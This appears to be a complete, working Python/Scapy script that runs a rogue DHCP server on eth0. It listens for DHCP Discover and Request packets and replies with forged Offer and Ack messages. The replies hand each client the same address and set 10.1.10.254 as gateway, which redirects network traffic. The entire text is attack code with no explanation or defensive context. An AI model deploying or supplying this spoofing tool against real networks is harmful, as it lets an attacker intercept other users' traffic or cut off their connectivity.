from scapy.all import *

def handle(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] in [1,3]:
        msg = "offer" if pkt[DHCP].options[0][1]==1 else "ack"
        rep = Ether(src=get_if_hwaddr("eth0"),dst=pkt[Ether].src)/IP(src="10.1.10.253",dst=pkt[IP].src)/UDP(sport=67,dport=68)/BOOTP(op=2,yiaddr="10.1.10.250",siaddr="10.1.10.253",chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid)/DHCP(options=[("message-type",msg),("server_id","10.1.10.253"),("lease_time",43200),("router","10.1.10.254"),("subnet_mask","255.255.255.0"),"end"])
        sendp(rep,iface="eth0",verbose=False)
        print(f"[+] {msg} envoyé")

sniff(iface="eth0",filter="udp and (port 67 or port 68)",prn=handle,store=0)